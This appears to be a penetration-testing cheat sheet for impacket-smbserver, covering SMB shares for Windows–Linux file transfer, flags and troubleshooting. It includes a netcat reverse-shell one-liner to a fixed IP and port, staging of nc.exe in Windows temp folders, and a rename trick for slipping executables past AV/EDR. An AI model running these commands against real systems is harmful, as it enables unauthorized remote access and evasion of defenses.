What is impacket-smbserver?

impacket-smbserver spins up a quick SMB server (SMB2 supported) from any directory. It's perfect for ad-hoc file sharing in labs, Windows ↔ Linux transfers, and staging tools during assessments. You can run it anonymously or require credentials. Use only on networks where you have permission.

Quick Start

Serve current directory (anonymous)

kali@kali$ impacket-smbserver share .
# Windows client:
C:\> dir \\<your-ip>\share

Install file from target machine

copy filename \\MY_IP\share

You can use binary via smbserver

\\10.10.16.38\share\nc64.exe -e cmd.exe 10.10.16.38 4444

Serve with SMB2 + credentials

kali@kali$ impacket-smbserver share /path/to/files -smb2support -username u -password p
# Windows client (map then copy):
C:\> net use \\<your-ip>\share /user:u p
C:\> copy \\<your-ip>\share\tool.exe C:\Windows\Temp\tool.exe

Single file test (good for connectivity)

C:\> type \\<your-ip>\share\readme.txt > NUL

Useful Flags

Flag What it does Example
-smb2support Enable SMB2 (better compatibility with modern Windows) -smb2support
-username, -password Require auth (NTLM). Recommended outside isolated labs. -username u -password p
-port Change listening TCP port (default 445). Requires client to specify non-default port via port-forward or proxy. -port 445
-config INI-style config with multiple shares. -config smb.conf
-debug Verbose logging (handy for auth and read/write failures). -debug

Examples in Context

Anonymous, quick push

# Serve the current folder as \\<ip>\share
kali@kali$ impacket-smbserver share . -smb2support

# On Windows (copy to temp)
C:\> copy \\<ip>\share\tool.ps1 %TEMP%\tool.ps1

Authenticated + map drive letter

kali@kali$ impacket-smbserver tools /opt/tools -smb2support -username u -password p
C:\> net use Z: \\<ip>\tools /user:u p
C:\> copy Z:\nc64.exe C:\Windows\Temp\nc.exe

Diagnose copy failures

# 1) Verify listing from Windows
C:\> dir \\<ip>\share

# 2) Try a tiny text first
C:\> copy \\<ip>\share\readme.txt %TEMP%\r.txt

# 3) If EXE fails but text works, suspect AV/EDR
#    Rename-on-wire trick:
C:\> copy \\<ip>\share\nc64.txt %TEMP%\nc.txt & ren %TEMP%\nc.txt nc.exe

Troubleshooting

  • “The user name or password is incorrect.” — Your server requires creds. Use net use \\IP\share /user:u p before copying, or run server without creds in a lab.
  • “An unexpected network error occurred.” / 0 file(s) copied.
    • Confirm the file is actually in the served directory: on Kali, run ls; from Windows, dir \\IP\share.
    • Try copying to a permissive path: %TEMP% or C:\Windows\Temp.
    • If text copies but EXE fails, AV/EDR may block executable streams. Rename-on-wire (.txt → .exe) or zip first.
    • Run server with -debug to see auth/IO errors.
  • Can list but cannot copy — Often destination ACL/Controlled Folder Access. Use %TEMP% first.
  • Old Windows client — Try without -smb2support (SMB1), but only on isolated labs.
  • Firewall — Ensure TCP 445 from target → your box is allowed (VPN/firewall/security group).

Config file example

# smb.conf (INI-style) for multiple shares
[global]
server_name = LABSMB
server_os   = Windows
server_domain = WORKGROUP

[tools]
comment = Tools share
path    = /opt/tools
read only = no

[drops]
comment = Staging
path    = /tmp/stage
read only = no
kali@kali$ impacket-smbserver -config smb.conf -smb2support -username u -password p

Cheat Sheet

  • Start server (SMB2, creds): impacket-smbserver share . -smb2support -username u -password p
  • Map (Windows): net use \\IP\share /user:u p or net use Z: \\IP\share /user:u p
  • List: dir \\IP\share
  • Copy: copy \\IP\share\file %TEMP%\file
  • Silent test read: type \\IP\share\file > NUL
  • Better errors: robocopy \\IP\share C:\Path file.ext /R:0 /W:0

Safety & Notes

  • Don’t expose test SMB to untrusted networks; require credentials where possible.
  • SMB1 is deprecated & risky; prefer -smb2support.
  • Windows is case-insensitive on paths; Linux share is case-sensitive for the served filenames.
